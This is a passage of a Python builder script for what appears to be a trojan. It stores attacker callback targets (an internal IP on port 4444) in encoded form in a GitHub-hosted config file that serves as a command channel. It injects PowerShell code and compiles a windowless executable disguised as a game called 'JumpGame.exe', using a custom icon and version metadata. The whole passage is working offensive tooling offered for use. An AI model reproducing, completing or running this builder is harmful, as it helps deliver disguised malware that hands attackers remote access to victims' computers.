            headers = {"Authorization": f"token {GITHUB_TOKEN}"}
            # Get existing SHA and content
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code == 404:
                print(f"{YELLOW}[!] Config file not found on GitHub. Nothing to reset.{RESET}")
                os._exit(0)
            resp.raise_for_status()
            sha = resp.json()["sha"]
            # Decode previous content for user display
            prev_content = resp.json().get("content", "")
            prev_content = prev_content.replace("\n", "")
            try:
                decoded = base64.b64decode(prev_content).decode("utf-8")
            except Exception as e:
                decoded = f"(Could not decode: {e})"
            # Format JSON for readability if possible
            formatted = decoded
            try:
                parsed = json.loads(decoded)
                formatted = json.dumps(parsed, indent=2)
            except Exception:
                pass
            empty_content = base64.b64encode(b"{}").decode()
            payload = {
                "message": "Reset config from Builder script",
                "content": empty_content,
                "branch": BRANCH,
                "sha": sha,
            }
            update_resp = requests.put(url, headers=headers, data=json.dumps(payload), timeout=10)
            if update_resp.status_code in [200, 201]:
                print(f"{GREEN}✅ Reset config.json on GitHub")
            else:
                print(f"{RED}❌ Failed to reset:", update_resp.json())
        except Exception as e:
            print(f"{RED}Reset error: {e}")
        os._exit(0)
    elif action == 3:
        os._exit(0)
    internal_ip = get_internal_ip()
    targets = [[internal_ip, 4444]]

    def update_github_config(targets):
        url = f"https://api.github.com/repos/{REPO}/contents/{GITHUB_FILE_PATH}?ref={BRANCH}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}

        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 404:
            print(f"{YELLOW}[!] Config file not found on GitHub.{RESET}")
            print(f"  {CYAN}Create an empty config.json in your repo first, then run again.{RESET}")
            return
        resp.raise_for_status()
        sha = resp.json()["sha"]

        new_content = {"TARGETS": enc(json.dumps(targets))}
        encoded_content = base64.b64encode(
            json.dumps(new_content, indent=2).encode()
        ).decode()

        payload = {
            "message": "Update config from Builder script",
            "content": encoded_content,
            "branch": BRANCH,
            "sha": sha,
        }

        update_resp = requests.put(url, headers=headers, data=json.dumps(payload), timeout=10)
        if update_resp.status_code in [200, 201]:
            print(f"{GREEN}✅ Updated config.json on GitHub")
        else:
            print(f"{RED}❌ Failed to update:", update_resp.json())

    print(f"{CYAN}[+] Internal IP: {internal_ip}")

    update_github_config(targets)

    update_ps_code()

    # Set default name before checking for existing exe
    name = "JumpGame"
    if os.path.exists(os.path.join(BASE_FOLDER, "JumpGame.exe")):
        try:
            act = int(
                input(
                    f"{CYAN}JumpGame.exe already exists, what to do?\n1) Replace old\n2) Make new\n3) Cancel\nChoice: "
                )
            )
        except ValueError:
            act = 3
        if act == 3:
            os._exit(0)
        elif act == 1:
            os.remove(os.path.join(BASE_FOLDER, "JumpGame.exe"))
            name = "JumpGame"
        elif act == 2:
            unique_path = get_unique_path(os.path.join(BASE_FOLDER, "JumpGame.exe"))
            name = os.path.splitext(os.path.basename(unique_path))[0]

    # --- Build EXE ---
    print(f"{CYAN}[*] Building EXE...")

    # --- Check if PyInstaller is installed ---
    try:
        import PyInstaller
    except ImportError:
        print(f"{YELLOW}[!] PyInstaller not found. Installing...{RESET}")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "PyInstaller"]
            )
            print(f"{GREEN}[+] PyInstaller installed successfully.{RESET}")
        except Exception as e:
            print(f"{RED}[!] Failed to install PyInstaller: {e}{RESET}")
            return

    try:
        cmd = [
            sys.executable,
            "-m",
            "PyInstaller",
            "--onefile",
            "--noconsole",
            "--hidden-import=pygame",
            "--hidden-import=time",
            "--hidden-import=subprocess",
            "--hidden-import=base64",
            "--hidden-import=random",
            "--hidden-import=threading",
            "--hidden-import=os",
            f"--icon={CUSTOM_ICON}",
            f"--version-file={VERSION_FILE}",
            f"--add-data={CUSTOM_DATA};.",
            f"--name",
            name,
            SCRIPT_PATH,
        ]
        print(f"{CYAN}[*] Running PyInstaller...")
        result = subprocess.run(cmd, text=True, capture_output=True)

        built_exe = os.path.join(BASE_FOLDER, "dist", f"{name}.exe")
        final_path = os.path.join(BASE_FOLDER, f"{name}.exe")

        if result.returncode != 0:
            print(f"{RED}[!] PyInstaller failed with code {result.returncode}")
            return

        if not os.path.exists(built_exe):
            print(f"{YELLOW}[!] Build reported success but EXE not found!")
            return

        # Move EXE to BASE_FOLDER
        try:
            if os.path.exists(final_path):
                os.remove(final_path)
            shutil.move(built_exe, final_path)
            print(f"{GREEN}[+] EXE moved to: {final_path}")
        except Exception as e:
            print(f"{RED}[!] Failed to move EXE: {e}")
            return

        # Cleanup
        try:
            spec_file = os.path.join(BASE_FOLDER, f"{name}.spec")
            build_dir = os.path.join(BASE_FOLDER, "build")
            dist_dir = os.path.join(BASE_FOLDER, "dist")

            if os.path.exists(spec_file):
                os.remove(spec_file)

            if os.path.exists(build_dir):
                shutil.rmtree(build_dir)

            if os.path.exists(dist_dir):
                shutil.rmtree(dist_dir)

            print(f"{GREEN}[*] Cleanup completed (spec, build, dist removed).")
        except Exception as e:
            print(f"{RED}[!] Cleanup error: {e}")

        print(f"{GREEN}[+] Build completed successfully: {final_path}")

    except Exception as e:
        print(f"{RED}[!] Unexpected error: {e}")


if ATTACKER_OS == 1:
    print(f"{CYAN}Detected os: macOS")
    validate_config_mac()
    run_build_logic_mac()
elif ATTACKER_OS == 2:
    print(f"{CYAN}Detected os: Windows")
    validate_config_win()
    run_build_logic_windows()
